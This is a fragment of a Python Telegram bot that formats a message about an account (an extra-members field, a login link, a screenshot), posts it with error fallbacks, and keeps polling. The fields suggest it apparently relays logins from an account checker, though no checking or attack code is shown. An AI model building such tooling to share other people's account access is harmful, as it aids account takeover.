        lines.append(f"👥 **EXTRA MEMBERS:** {esc(data.get('extra_members', 'No ❌'))}")
        
        lines.append("")
        lines.append(f"💜 [CLICK HERE TO LOGIN]({login_url}) 💜")
        lines.append("")
        lines.append("━━━━━━━━━━━━━━━━━━━━━━")
        lines.append("👨‍💻 **Admin:** [Message Me](https://t.me/F88UF) | 📢 **Channel:** [Join Here](https://t.me/F88UF9844)")
        
        msg = "\n".join(lines)
        
        if res.get('screenshot'):
            try:
                # Use BytesIO for better compatibility
                img = io.BytesIO(res['screenshot'])
                img.name = 'screenshot.jpg' 
                bot.send_photo(chat_id, img, caption=msg, parse_mode="Markdown", reply_markup=markup)
            except Exception as e:
                print(f"Send Photo Error: {e}")
                # Fallback: Send text, then try sending photo separately
                bot.send_message(chat_id, msg, parse_mode="Markdown", reply_markup=markup, disable_web_page_preview=True)
                try:
                    img.seek(0)
                    bot.send_photo(chat_id, img, caption="Screenshot (Caption failed)")
                except: pass
        else:
            bot.send_message(chat_id, msg, parse_mode="Markdown", reply_markup=markup, disable_web_page_preview=True)

    # Fix for Conflict error: skip pending updates
    while True:
        try:
            bot.infinity_polling(timeout=90, long_polling_timeout=60, skip_pending=True)
        except Exception as e:
            print(f"⚠️ Polling Error: {e}")
            # If conflict (409), wait longer to allow other instance to close
            if "409" in str(e):
                time.sleep(15)
            else:
                time.sleep(5)

if __name__ == "__main__":
    main()